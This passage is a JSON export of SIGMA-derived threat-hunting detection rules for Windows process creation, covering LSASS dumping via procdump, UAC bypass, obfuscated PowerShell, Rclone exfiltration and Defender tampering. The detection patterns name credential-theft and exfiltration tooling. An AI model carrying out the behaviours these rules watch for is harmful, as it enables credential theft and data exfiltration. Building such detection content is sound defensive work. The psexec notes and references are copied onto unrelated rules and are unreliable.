\"\ud83d\ude47\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\u200d\u2640\ufe0f\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 429
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1542"
            ],
            "name": "UEFI Persistence Via Wpbbin - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path=\"C:\\Windows\\System32\\wpbbin.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 430
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass WSReset",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wsreset.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 431
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious parent process for cmd.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Unusual Parent Process For Cmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cmd.exe\" and (src.process.image.path contains \"\\csrss.exe\" or src.process.image.path contains \"\\ctfmon.exe\" or src.process.image.path contains \"\\dllhost.exe\" or src.process.image.path contains \"\\epad.exe\" or src.process.image.path contains \"\\FlashPlayerUpdateService.exe\" or src.process.image.path contains \"\\GoogleUpdate.exe\" or src.process.image.path contains \"\\jucheck.exe\" or src.process.image.path contains \"\\jusched.exe\" or src.process.image.path contains \"\\LogonUI.exe\" or src.process.image.path contains \"\\lsass.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\SearchIndexer.exe\" or src.process.image.path contains \"\\SearchProtocolHost.exe\" or src.process.image.path contains \"\\SIHClient.exe\" or src.process.image.path contains \"\\sihost.exe\" or src.process.image.path contains \"\\slui.exe\" or src.process.image.path contains \"\\spoolsv.exe\" or src.process.image.path contains \"\\sppsvc.exe\" or src.process.image.path contains \"\\taskhostw.exe\" or src.process.image.path contains \"\\unsecapp.exe\" or src.process.image.path contains \"\\WerFault.exe\" or src.process.image.path contains \"\\wermgr.exe\" or src.process.image.path contains \"\\wlanext.exe\" or src.process.image.path contains \"\\WUDFHost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 432
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of NirCmd tool for command execution as SYSTEM user",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1569"
            ],
            "name": "PUA - NirCmd Execution As LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \" runassystem \") | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 433
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of 3proxy, a tiny free proxy server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "PUA - 3Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\3proxy.exe\" or tgt.process.displayName=\"3proxy - tiny proxy server\" or tgt.process.cmdline contains \".exe -i127.0.0.1 -p\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 434
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Obfuscated PowerShell Code",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"IAAtAGIAeABvAHIAIAAwAHgA\" or tgt.process.cmdline contains \"AALQBiAHgAbwByACAAMAB4A\" or tgt.process.cmdline contains \"gAC0AYgB4AG8AcgAgADAAeA\" or tgt.process.cmdline contains \"AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg\" or tgt.process.cmdline contains \"AuAEkAbgB2AG8AawBlACgAKQAgAHwAI\" or tgt.process.cmdline contains \"ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC\" or tgt.process.cmdline contains \"AHsAMQB9AHsAMAB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADEAfQB7ADAAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAxAH0AewAwAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMAB9AHsAMwB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADAAfQB7ADMAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAwAH0AewAzAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMgB9AHsAMAB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADIAfQB7ADAAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAyAH0AewAwAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMQB9AHsAMAB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADEAfQB7ADAAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAxAH0AewAwAH0AJwAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMAB9AHsAMwB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADAAfQB7ADMAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAwAH0AewAzAH0AJwAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMgB9AHsAMAB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADIAfQB7ADAAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAyAH0AewAwAH0AJwAgAC0AZgAg\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 435
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1210"
            ],
            "name": "Suspicious SysAidServer Child",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and src.process.cmdline contains \"SysAidServer\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 436
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\nThis way we are also able to catch cases in which the attacker has renamed the procdump executable.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Potential LSASS Process Dump Via Procdump",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -ma \" or tgt.process.cmdline contains \" /ma \" or tgt.process.cmdline contains \" \u2013ma \" or tgt.process.cmdline contains \" \u2014ma \" or tgt.process.cmdline contains \" \u2015ma \") and tgt.process.cmdline contains \" ls\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 437
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Tamper Windows Defender Remove-MpPreference",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Remove-MpPreference\" and (tgt.process.cmdline contains \"-ControlledFolderAccessProtectedFolders \" or tgt.process.cmdline contains \"-AttackSurfaceReductionRules_Ids \" or tgt.process.cmdline contains \"-AttackSurfaceReductionRules_Actions \" or tgt.process.cmdline contains \"-CheckForSignaturesBeforeRunningScan \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 438
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on\nInstead they modify the task after creation to include their malicious payload\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Modification Of Scheduled Tasks",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /Change \" and tgt.process.cmdline contains \" /TN \")) and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\WINDOWS\\Temp\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"C:\\ProgramData\\\" or tgt.process.cmdline contains \"C:\\Perflogs\\\" or tgt.process.cmdline contains \"%ProgramData%\" or tgt.process.cmdline contains \"%appdata%\" or tgt.process.cmdline contains \"%comspec%\" or tgt.process.cmdline contains \"%localappdata%\") and (tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"bash.exe\" or tgt.process.cmdline contains \"bash \" or tgt.process.cmdline contains \"scrcons\" or tgt.process.cmdline contains \"wmic \" or tgt.process.cmdline contains \"wmic.exe\" or tgt.process.cmdline contains \"forfiles\" or tgt.process.cmdline contains \"scriptrunner\" or tgt.process.cmdline contains \"hh.exe\" or tgt.process.cmdline contains \"hh \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 439
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious MsiExec Embedding Parent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (src.process.cmdline contains \"MsiExec.exe\" and src.process.cmdline contains \"-Embedding \")) and (not ((tgt.process.image.path contains \":\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \"C:\\Program Files\\SplunkUniversalForwarder\\bin\\\") or (tgt.process.cmdline contains \"\\DismFoDInstall.cmd\" or (src.process.cmdline contains \"\\MsiExec.exe -Embedding \" and src.process.cmdline contains \"Global\\MSI0000\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 440
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Outlook EnableUnsafeClientMailRules Setting Enabled",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\\Outlook\\Security\\EnableUnsafeClientMailRules\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 441
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious program execution in Outlook temp folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Suspicious Execution From Outlook Temporary Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\Temporary Internet Files\\Content.Outlook\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 442
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567"
            ],
            "name": "PUA - Rclone Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"--config \" and tgt.process.cmdline contains \"--no-check-certificate \" and tgt.process.cmdline contains \" copy \") or ((tgt.process.image.path contains \"\\rclone.exe\" or tgt.process.displayName=\"Rsync for cloud storage\") and (tgt.process.cmdline contains \"pass\" or tgt.process.cmdline contains \"user\" or tgt.process.cmdline contains \"copy\" or tgt.process.cmdline contains \"sync\" or tgt.process.cmdline contains \"config\" or tgt.process.cmdline contains \"lsd\" or tgt.process.cmdline contains \"remote\" or tgt.process.cmdline contains \"ls\" or tgt.process.cmdline contains \"mega\" or tgt.process.cmdline contains \"pcloud\" or tgt.process.cmdline contains \"ftp\" or tgt.process.cmdline contains \"ignore-existing\" or tgt.process.cmdline contains \"auto-confirm\" or tgt.process.cmdline contains \"transfers\" or tgt.process.cmdline contains \"multi-thread-streams\" or tgt.process.cmdline contains \"no-check-certificate \")))) | columns tgt.process.cmdline,src.process.cmdline,Details",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 443
    },
    {
        "fields": {
            "actors": [],
